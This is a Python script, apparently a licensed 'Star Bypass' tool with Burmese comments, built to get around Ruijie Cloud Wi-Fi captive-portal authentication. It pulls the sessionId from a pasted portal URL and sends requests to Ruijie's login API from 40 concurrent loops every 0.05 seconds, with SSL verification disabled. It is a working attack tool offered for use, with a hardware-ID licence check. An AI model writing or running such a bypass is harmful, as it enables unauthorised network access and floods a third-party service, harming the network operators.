import os
import sys
import json
import time
import base64
import asyncio
import aiohttp
import requests
import urllib3
import hashlib
import platform
from urllib.parse import urlparse, parse_qs

# SSL Warning များကို ပိတ်ထားခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class StarProject:
    def __init__(self):
        # သင်၏ GitHub Database Link
        self.db_link = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
        }

    def clear(self):
        os.system('clear')

    def get_hwid(self):
        try:
            info = f"{platform.processor()}{platform.node()}{platform.machine()}{os.getlogin()}"
            id_hash = hashlib.sha256(info.encode()).hexdigest()
            return f"MOE-{id_hash[:12].upper()}"
        except:
            return "UNKNOWN-HWID-ERROR"

    def banner(self, my_id):
        self.clear()
        print("\033[1;32m   _____ _______       _____  ")
        print("  / ____|__   __|/\\   |  __ \\ ")
        print(" | (___    | |  /  \\  | |__) |")
        print("  \\___ \\   | | / /\\ \\ |  _  / ")
        print("  ____) |  | |/ ____ \\| | \\ \\ ")
        print(" |_____/   |_/_/    \\_\\_|  \\_\\")
        print("\033[1;37m-"*45)
        print(f"\033[1;33m >> OWNER : MOE YU")
        print(f"\033[1;33m >> HWID  : {my_id}")
        print("\033[1;37m-"*45)

    async def check_access(self, session, my_hwid):
        try:
            async with session.get(self.db_link) as response:
                if response.status == 200:
                    text = await response.text()
                    # key.txt ထဲမှ HWID များကို စစ်ဆေးခြင်း
                    if my_hwid in text:
                        return True, "Successfully Connected"
                    else:
                        return False, "Your HWID is not registered!"
                else:
                    return False, "Server Down (404/500)"
        except Exception as e:
            return False, f"Connection Error: {str(e)}"

    async def send_pulse(self, session, url):
        """အင်တာနက်ပွင့်စေရန် Cloud Server ဆီသို့ အမြန်နှုန်းဖြင့် Request ပို့ခြင်း"""
        while True:
            try:
                async with session.get(url, timeout=5) as response:
                    status_color = "\033[1;32m" if response.status == 200 else "\033[1;31m"
                    sys.stdout.write(f"{status_color}[✓] STAR BYPASS ACTIVE | STATUS: {response.status}\033[0m\r")
                    sys.stdout.flush()
            except: pass
            await asyncio.sleep(0.05)

    async def start_bypass(self, portal_url):
        p = parse_qs(urlparse(portal_url).query)
        sid = p.get('sessionId', [None])[0]
        res = p.get('RES', [''])[0]
        
        if not sid:
            print("\n\033[1;31m[-] Session ID မတွေ့ပါ။ Link ကို Browser မှ ပြန်ကူးပါ။")
            return

        # Ruijie Cloud v2 Auth API
        target_url = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/login?sessionId={sid}&res={res}"
        
        print(f"\033[1;32m\n[+] Target SID: {sid[:15]}...")
        print("\033[1;33m[*] Engine Started. Please wait for internet access.\n")

        async with aiohttp.ClientSession(headers=self.headers, connector=aiohttp.TCPConnector(ssl=False)) as session:
            tasks = [asyncio.create_task(self.send_pulse(session, target_url)) for _ in range(40)]
            await asyncio.gather(*tasks)

    async def start(self):
        my_hwid = self.get_hwid()
        self.banner(my_hwid)
        
        async with aiohttp.ClientSession(headers=self.headers) as session:
            print("\033[1;34m[*] Verifying License... Please wait.")
            access, message = await self.check_access(session, my_hwid)
            
            if access:
                print(f"\033[1;32m[+] Access Granted: {message}")
                await self.main_menu()
            else:
                print(f"\033[1;31m[-] Access Denied: {message}")
                sys.exit()

    async def main_menu(self):
        print("\n\033[1;36m[1] Start Bypass Service")
        print("[2] Update Script")
        print("[3] Exit")
        
        opt = input("\n\033[1;32mChoose Option > ")
        
        if opt == "1":
            portal_link = input("\n\033[1;33m[!] Paste Portal URL from Browser: ").strip()
            if portal_link:
                await self.start_bypass(portal_link)
        elif opt == "2":
            print("[*] Checking for updates...")
            os.system("git pull")
        else:
            sys.exit()

if __name__ == "__main__":
    bot = StarProject()
    try:
        asyncio.run(bot.start())
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Stopped by user.")
